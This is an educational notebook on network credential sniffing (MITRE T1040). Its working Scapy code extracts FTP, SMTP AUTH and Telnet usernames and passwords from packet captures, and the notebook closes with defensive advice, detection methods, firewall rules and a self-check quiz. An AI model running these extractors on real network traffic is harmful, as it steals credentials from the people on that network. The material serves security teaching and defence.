# Network Credential Sniffing

---

**MITRE ATT&CK** `T1040` · **Tactic:** Credential Access · **Difficulty:** Intermediate · **Time:** ~55 min

> Unencrypted protocols are still common in production networks, especially in industrial environments, legacy infrastructure, and internal networks where 'it's fine, it doesn't touch the internet' is the security strategy. FTP, SMTP, and Telnet all transmit credentials in plaintext. If you can see the packets, you own the credentials.

---

### What you'll understand after this notebook

1. How FTP, SMTP, and Telnet authentication works at the protocol level — and why they're trivially sniffable
2. How to parse real packet captures (PCAP files) with Scapy to extract credentials from network traffic
3. The base64 encoding that SMTP uses and why it provides zero security
4. How to detect credential sniffing on your network and which protocols to eliminate

---

### Real-world context

In the 2013 Target breach, attackers who compromised a third-party HVAC vendor used network sniffing to harvest credentials as they moved laterally through the network. In 2014, the JP Morgan Chase breach involved ARP poisoning to redirect traffic through an attacker-controlled host — enabling live credential capture. Network sniffing post-compromise is a standard lateral movement enabler.

## 1. The Problem: Authentication Without Encryption

### FTP (Port 21)

FTP sends credentials as literal ASCII text:
```
CLIENT → SERVER:  USER admin\r\n
SERVER → CLIENT:  331 Password required\r\n
CLIENT → SERVER:  PASS supersecret123\r\n
SERVER → CLIENT:  230 User logged in\r\n
```
The `Raw` layer of the TCP packet contains this exact text. No encoding, no hashing, no TLS.

### SMTP AUTH (Port 25)

SMTP AUTH uses base64 encoding — which is encoding, not encryption. Decodable instantly:
```
CLIENT → SERVER:  AUTH LOGIN
SERVER → CLIENT:  334 VXNlcm5hbWU6  (base64 for "Username:")
CLIENT → SERVER:  YWRtaW4=         (base64 for "admin")
SERVER → CLIENT:  334 UGFzc3dvcmQ6  (base64 for "Password:")
CLIENT → SERVER:  c3VwZXJzZWNyZXQ= (base64 for "supersecret")
```

### Telnet (Port 23)

Telnet is entirely plaintext — the login prompt exchange is visible character by character:
```
SERVER → CLIENT:  login: 
CLIENT → SERVER:  admin\n
SERVER → CLIENT:  Password:
CLIENT → SERVER:  supersecret\n
```
The complication: Telnet often sends one character per packet (character mode), requiring reassembly.

In [ ]:
from scapy.all import *       # packet parsing and capture
from base64 import b64decode  # for SMTP AUTH decoding
import re                     # for email address detection in SMTP
import matplotlib.pyplot as plt
import matplotlib.patches as mpatches
from collections import defaultdict

conf.verb = 0  # suppress Scapy output

## 2. FTP Credential Extraction

FTP credentials are in TCP packets destined for port 21. The payload starts with either `USER ` or `PASS ` as a literal string prefix — making extraction trivial.

In [ ]:
def ExtractFTP(packet):
    """
    Extracts FTP credentials from a single packet.
    FTP AUTH uses plaintext USER/PASS commands on port 21.
    """
    try:
        # Decode the raw TCP payload as UTF-8 text, strip trailing newline
        payload = packet[Raw].load.decode('utf-8').rstrip()
    except (UnicodeDecodeError, AttributeError):
        return None
    
    # FTP USER command: "USER username\r\n"
    if payload[:4] == 'USER':
        username = payload[5:]  # everything after 'USER '
        return {
            'protocol': 'FTP',
            'type': 'username',
            'value': username,
            'server': packet[IP].dst
        }
    
    # FTP PASS command: "PASS password\r\n"
    elif payload[:4] == 'PASS':
        password = payload[5:]  # everything after 'PASS '
        return {
            'protocol': 'FTP',
            'type': 'password',
            'value': password,
            'server': packet[IP].dst
        }
    
    return None

## 3. SMTP Credential Extraction

SMTP AUTH base64-encodes credentials. The challenge: we see individual packets without context about which is the username and which is the password. The solution: track connections by `(src_ip, src_port)` and use the email regex to identify which base64 blob is the username.

In [ ]:
EMAIL_REGEX = r'^[a-z0-9]+[\._]?[a-z0-9]+[@]\w+[.]\w{2,3}$'

# State tracker: connections where we've seen the username but not yet the password
smtp_pending_passwords = []  # list of [src_ip, src_port] pairs


def ExtractSMTP(packet):
    """
    Extracts SMTP AUTH credentials by decoding base64 payloads.
    
    SMTP AUTH LOGIN sequence:
      1. Client sends base64-encoded email address (username)
      2. Client sends base64-encoded password
    
    Strategy: decode every base64 blob on port 25 traffic.
    If decoded text matches email regex → it's a username, save the connection.
    Next base64 blob from the same connection → it's the password.
    """
    try:
        payload = packet[Raw].load
    except AttributeError:
        return None
    
    try:
        decoded = b64decode(payload).decode('utf-8')
    except Exception:
        return None  # Not base64 encoded — skip
    
    conn = [packet[IP].src, packet[TCP].sport]
    
    # Is this a base64-encoded email address? → must be the username
    if re.search(EMAIL_REGEX, decoded, re.IGNORECASE):
        smtp_pending_passwords.append(conn)
        return {
            'protocol': 'SMTP',
            'type': 'username',
            'value': decoded,
            'server': packet[IP].dst
        }
    
    # If we've already seen the username from this connection → this is the password
    elif conn in smtp_pending_passwords:
        smtp_pending_passwords.remove(conn)
        return {
            'protocol': 'SMTP',
            'type': 'password',
            'value': decoded,
            'server': packet[IP].dst
        }
    
    return None

## 4. Telnet Credential Extraction

Telnet is the trickiest because:
1. The server sends the prompt (`login: `, `Password: `), not the client
2. The client's response might be in separate packets (one char per packet in character mode)
3. We need to track direction: server→client for prompts, client→server for credentials

In [ ]:
# State: connections where the server has sent the login or password prompt
telnet_awaiting_login    = []  # [src_ip, src_port] of connections that got 'login:' prompt
telnet_awaiting_password = []  # [src_ip, src_port] of connections that got 'Password:' prompt


def ExtractTelnet(packet):
    """
    Extracts Telnet credentials by tracking the login state machine.
    
    State machine:
    1. Server sends 'login: ' → mark connection as awaiting username
    2. Client sends string → that's the username
    3. Server sends 'Password: ' → mark connection as awaiting password  
    4. Client sends string → that's the password
    
    Key insight: src/dst depends on direction. We check both orientations.
    """
    try:
        payload = packet[Raw].load.decode('utf-8').rstrip()
    except (UnicodeDecodeError, AttributeError):
        return None
    
    # Server → Client: check if the server is sending a prompt
    # Assumption: server IP is packet source when sending prompts
    server_to_client_conn = [packet[IP].src, packet[TCP].sport]
    
    if payload[:5] == 'login':      # 'login: '
        telnet_awaiting_login.append(server_to_client_conn)
        return None  # prompts aren't credentials
    
    elif payload[:8] == 'Password':  # 'Password: '
        telnet_awaiting_password.append(server_to_client_conn)
        return None
    
    # Client → Server: check if this is a response to a prompt
    # When client responds, their IP is src, server IP is dst
    client_to_server_conn = [packet[IP].dst, packet[TCP].dport]
    
    if client_to_server_conn in telnet_awaiting_login:
        telnet_awaiting_login.remove(client_to_server_conn)
        return {
            'protocol': 'Telnet',
            'type': 'username',
            'value': payload,
            'server': packet[IP].dst
        }
    
    elif client_to_server_conn in telnet_awaiting_password:
        telnet_awaiting_password.remove(client_to_server_conn)
        return {
            'protocol': 'Telnet',
            'type': 'password',
            'value': payload,
            'server': packet[IP].dst
        }
    
    return None

## 5. Processing a PCAP File

The original script reads from `merged.pcap`. Scapy's `rdpcap()` loads the entire capture into memory as a list of packets. Each packet is then routed to the appropriate extractor based on its destination port.

In [ ]:
def analyze_pcap(pcap_path):
    """
    Main PCAP analysis function.
    Routes each TCP packet with payload to the appropriate protocol extractor.
    Returns list of found credentials.
    """
    try:
        packets = rdpcap(pcap_path)
    except FileNotFoundError:
        print(f'[!] PCAP file not found: {pcap_path}')
        print('    Generate a test PCAP in a lab environment or use Wireshark sample captures.')
        return []
    
    print(f'Loaded {len(packets)} packets from {pcap_path}')
    credentials = []
    
    for packet in packets:
        # Only process TCP packets that have a payload (Raw layer)
        if not (packet.haslayer(TCP) and packet.haslayer(Raw)):
            continue
        
        result = None
        dst_port = packet[TCP].dport
        src_port = packet[TCP].sport
        
        # Route to the right extractor based on port
        if dst_port == 21:   # FTP — client sending to server
            result = ExtractFTP(packet)
        
        elif dst_port == 25: # SMTP — client sending to server
            result = ExtractSMTP(packet)
        
        elif dst_port == 23 or src_port == 23:  # Telnet — bidirectional
            result = ExtractTelnet(packet)
        
        if result:
            credentials.append(result)
            emoji = '👤' if result['type'] == 'username' else '🔑'
            print(f'{emoji} [{result["protocol"]}] {result["type"]}: {result["value"]} (server: {result["server"]})')
    
    return credentials


# Run on a PCAP file — replace with your own capture
# To generate a test PCAP:
#   1. Start Wireshark capturing on your lab NIC
#   2. FTP to a test server: ftp 192.168.x.x
#   3. Stop capture, save as merged.pcap
credentials = analyze_pcap('merged.pcap')

## 6. Visualizing Protocol Distribution

If you ran the PCAP analysis successfully, this shows the breakdown of credential exposures by protocol.

In [ ]:
# Demonstrate with synthetic data if no PCAP available
if not credentials:
    print('Using synthetic demo data (no PCAP found)')
    credentials = [
        {'protocol': 'FTP',    'type': 'username', 'value': 'admin',      'server': '10.0.0.5'},
        {'protocol': 'FTP',    'type': 'password', 'value': 'ftp123',     'server': '10.0.0.5'},
        {'protocol': 'SMTP',   'type': 'username', 'value': 'user@co.com','server': '10.0.0.10'},
        {'protocol': 'SMTP',   'type': 'password', 'value': 'letmein',    'server': '10.0.0.10'},
        {'protocol': 'Telnet', 'type': 'username', 'value': 'root',       'server': '10.0.0.15'},
        {'protocol': 'Telnet', 'type': 'password', 'value': 'toor',       'server': '10.0.0.15'},
        {'protocol': 'FTP',    'type': 'username', 'value': 'backup',     'server': '10.0.0.5'},
        {'protocol': 'Telnet', 'type': 'password', 'value': 'admin',      'server': '10.0.0.20'},
    ]

# Count by protocol
proto_counts = defaultdict(int)
for c in credentials:
    proto_counts[c['protocol']] += 1

fig, (ax1, ax2) = plt.subplots(1, 2, figsize=(12, 5))
fig.patch.set_facecolor('#0F0F0F')

proto_colors = {'FTP': '#CF6C6C', 'SMTP': '#CFB86C', 'Telnet': '#CF9B6C'}

# Left: donut chart of protocol distribution
ax1.set_facecolor('#1A1A1A')
labels = list(proto_counts.keys())
sizes  = list(proto_counts.values())
colors = [proto_colors.get(l, '#6C9BCF') for l in labels]
wedges, texts, autotexts = ax1.pie(
    sizes, labels=labels, colors=colors,
    autopct='%1.0f%%', startangle=90,
    wedgeprops={'width': 0.5, 'edgecolor': '#0F0F0F', 'linewidth': 2},
    textprops={'color': '#EDEAE4', 'fontsize': 11}
)
ax1.set_title('Credentials by Protocol', color='#EDEAE4', fontsize=12)

# Right: credential pairs per server
ax2.set_facecolor('#1A1A1A')
server_counts = defaultdict(int)
for c in credentials:
    if c['type'] == 'password':
        server_counts[c['server']] += 1

servers = list(server_counts.keys())
counts  = list(server_counts.values())
bars = ax2.barh(servers, counts, color='#CF6C6C', edgecolor='#282828')
ax2.set_xlabel('Credential pairs captured', color='#7A7570')
ax2.set_title('Exposed Servers', color='#EDEAE4', fontsize=12)
ax2.tick_params(colors='#7A7570')
for spine in ax2.spines.values():
    spine.set_edgecolor('#282828')

plt.tight_layout()
plt.savefig('../cyberlab/content/articles/13_credential_sniff.png', dpi=150, bbox_inches='tight')
plt.show()

## 7. Defender's Perspective

### The only real fix: eliminate the protocols

| Plaintext Protocol | Encrypted Replacement | Migration Effort |
|-------------------|-----------------------|------------------|
| FTP (21) | SFTP (22) or FTPS (990) | Low — drop-in replacement |
| SMTP AUTH without TLS | SMTP over TLS / STARTTLS (587) | Low — config change |
| Telnet (23) | SSH (22) | Low — `ssh` vs `telnet` |

### Network-level detection

| Detection Method | What to look for |
|-----------------|------------------|
| Promiscuous mode detection | NICs in promiscuous mode will respond to ARP probes for non-existent IPs |
| Honeypot credentials | Deploy fake FTP/Telnet services with fake creds — any login attempt = active sniffer |
| Network tap / SPAN port monitoring | Monitor for ARP poisoning (duplicate ARP replies for same IP from different MACs) |
| IDS signatures | Alert on `USER ` + `PASS ` sequence on port 21 from same source within 10 seconds |

### Firewall rules to add today

```bash
# Block legacy plaintext protocols from leaving your network
iptables -A OUTPUT -p tcp --dport 21 -j DROP   # FTP
iptables -A OUTPUT -p tcp --dport 23 -j DROP   # Telnet
# Allow SMTP only over TLS
iptables -A OUTPUT -p tcp --dport 25 -j DROP   # block plaintext SMTP
iptables -A OUTPUT -p tcp --dport 587 -j ACCEPT # allow SMTP submission (TLS)
```

## 8. Article Seed

---

**Suggested title:** *How Attackers Steal Credentials From Your Network Traffic (And How to Stop Them)*

**Opening paragraph (edit this):**

> Your network has credentials flowing through it right now — in plaintext. FTP, legacy SMTP configurations, and Telnet are still running in production networks everywhere, especially in manufacturing, healthcare, and financial infrastructure where 'if it ain't broke' is the operational philosophy. In this article, I'll show exactly how a Python script extracts usernames and passwords from a packet capture, why base64 encoding in SMTP provides zero security, and what you need to do to eliminate this attack surface.

**Section headers:**
1. Three protocols that send passwords in plaintext (and why they're still everywhere)
2. Parsing PCAP files with Scapy — how the extraction works
3. Why SMTP base64 is encoding, not encryption
4. Eliminating the risk: the encrypted alternatives

**Medium tags:** `cybersecurity, networking, python, credentials, blue-team`

---

In [ ]:
# Self-check

# Q1: Why doesn't base64 encoding protect SMTP passwords?
base64_is_not = None  # fill in: 'encryption', 'hashing', or 'encoding'
assert base64_is_not == 'encryption', 'base64 is encoding — reversible by anyone, no key needed'

# Q2: What makes Telnet harder to sniff than FTP?
telnet_challenge = None  # fill in a short string about character mode
assert 'charact' in telnet_challenge.lower() or 'packet' in telnet_challenge.lower(), \
    'Telnet can send one character per packet, requiring state tracking'

# Q3: What is the encrypted replacement for Telnet?
telnet_replacement = None
assert telnet_replacement.upper() == 'SSH', 'SSH replaces Telnet — same purpose, encrypted channel'

print('All checks passed. You understand network credential sniffing.')